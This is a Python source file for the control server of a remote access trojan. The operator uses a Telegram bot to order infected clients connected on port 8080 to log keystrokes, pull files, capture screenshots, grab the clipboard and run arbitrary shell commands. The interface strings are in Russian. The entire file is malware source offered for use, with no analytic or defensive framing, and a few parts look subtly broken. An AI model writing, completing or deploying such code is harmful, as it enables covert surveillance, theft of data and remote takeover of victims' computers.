import asyncio
import json
import socket
import threading
import os
import logging
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import binascii

logging.basicConfig(level=logging.INFO)

class RATServer:
    def __init__(self):
        self.bot_token = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
        self.allowed_chat_id = int(os.getenv('CHAT_ID', 'YOUR_CHAT_ID'))
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(("0.0.0.0", 8080))
        self.clients = []
        self.data_store = []

    async def start_command(self, update, context):
        if update.message.chat_id != self.allowed_chat_id:
            return
        keyboard = [
            [InlineKeyboardButton("Клавиши", callback_data="keylog"),
             InlineKeyboardButton("Файлы", callback_data="files")],
            [InlineKeyboardButton("Скриншот", callback_data="hvnc"),
             InlineKeyboardButton("Буфер обмена", callback_data="clipper")],
            [InlineKeyboardButton("Команда", callback_data="exec"),
             InlineKeyboardButton("Статус", callback_data="status")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("RAT активен. Выберите команду:", reply_markup=reply_markup)

    async def button_handler(self, update, context):
        query = update.callback_query
        await query.answer()
        if query.message.chat_id != self.allowed_chat_id:
            return

        command = query.data
        if command == "exec":
            await query.message.reply_text("Введите команду: /exec <команда>")
        else:
            self.send_to_clients(json.dumps({"command": command}))
            await asyncio.sleep(1)
            response = self.get_sorted_data(command)
            if response:
                if command == "hvnc":
                    await query.message.reply_photo(photo=binascii.unhexlify(response["data"]), filename="screenshot.png")
                else:
                    await query.message.reply_text(f"{command.capitalize()}:\n{response['data']}")
            else:
                await query.message.reply_text(f"Нет данных для {command}.")

    async def exec_command(self, update, context):
        if update.message.chat_id != self.allowed_chat_id:
            return
        cmd = " ".join(context.args)
        if not cmd:
            await update.message.reply_text("Введите команду: /exec <команда>")
            return
        self.send_to_clients(json.dumps({"command": "exec", "data": cmd}))
        await asyncio.sleep(1)
        response = self.get_sorted_data("shell")
        await update.message.reply_text(f"Вывод команды:\n{response['data'] if response else 'Нет данных.'}")

    def get_sorted_data(self, data_type):
        filtered = [d for d in self.data_store if d["type"] == data_type and d["client_id"] == "client_1"]
        return max(filtered, key=lambda x: x["timestamp"], default=None)

    def send_to_clients(self, command):
        for client in self.clients[:]:
            try:
                client.send(command.encode())
            except Exception as e:
                logging.error(f"Client send error: {e}")
                self.clients.remove(client)

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(65536).decode()
                if not data:
                    break
                data_dict = json.loads(data)
                if data_dict["type"] == "screenshot":
                    data_dict["data"] = data_dict["data"].decode()
                self.data_store.append(data_dict)
                if len(self.data_store) > 100:
                    self.data_store = self.data_store[-100:]
            except Exception as e:
                logging.error(f"Handle client error: {e}")
                break
        client_socket.close()
        self.clients.remove(client_socket)

    def start_server(self):
        self.server_socket.listen(5)
        logging.info("Сервер запущен на 0.0.0.0:8080")
        while True:
            client_socket, addr = self.server_socket.accept()
            logging.info(f"New client from {addr}")
            self.clients.append(client_socket)
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

    async def run_bot(self):
        app = Application.builder().token(self.bot_token).build()
        app.add_handler(CommandHandler("start", self.start_command))
        app.add_handler(CommandHandler("exec", self.exec_command))
        app.add_handler(CallbackQueryHandler(self.button_handler))
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        logging.info("Бот запущен")

    def run(self):
        threading.Thread(target=self.start_server).start()
        asyncio.run(self.run_bot())

if __name__ == "__main__":
    server = RATServer()
    server.run()
